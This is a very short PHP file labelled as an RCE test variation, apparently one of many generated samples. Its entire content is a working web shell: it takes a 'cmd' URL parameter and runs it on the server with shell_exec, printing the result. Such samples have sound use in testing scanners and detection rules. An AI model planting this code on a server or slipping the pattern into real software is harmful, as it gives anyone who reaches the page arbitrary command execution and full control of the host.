<?php
// RCE test variation #468
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>